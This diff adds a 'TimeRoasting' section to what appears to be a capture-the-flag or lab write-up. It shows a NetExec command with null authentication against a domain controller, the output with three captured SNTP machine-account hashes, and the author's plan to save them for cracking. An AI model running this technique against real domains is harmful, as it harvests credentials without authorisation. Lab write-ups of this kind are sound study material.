@@ -218,6 +218,18 @@ Looks like there is a machine account `FRG0310$`
 # TimeRoasting
 
 ```python
+nxc smb dc01.fragments.local -u '' -p '' -M timeroast --smb-timeout 5 
+SMB         10.0.29.162     445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:fragments.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.0.29.162     445    DC01             [+] fragments.local\: 
+TIMEROAST   10.0.29.162     445    DC01             [*] Starting Timeroasting...
+TIMEROAST   10.0.29.162     445    DC01             1000:$sntp-ms$e68346c899760c793adf42f2951095c9$1c0111e900000000000a08434c4f434cee1b34d96467d92de1b8428bffbfcd0aee1b3fbea09095e4ee1b3fbea090f22b
+TIMEROAST   10.0.29.162     445    DC01             1105:$sntp-ms$78276a9558e9c4bb2159c199767b7416$1c0111e900000000000a08444c4f434cee1b34d96367df0ce1b8428bffbfcd0aee1b3fbf4367a601ee1b3fbf436808fd
+TIMEROAST   10.0.29.162     445    DC01             1103:$sntp-ms$53f13f15a697cb399576d35a20bd875a$1c0111e900000000000a08444c4f434cee1b34d9645c5062e1b8428bffbfcd0aee1b3fbf4085172bee1b3fbf40856cbb
+```
+
+Ill place these hashes into a text file!
+
+```python
 
 ```
 
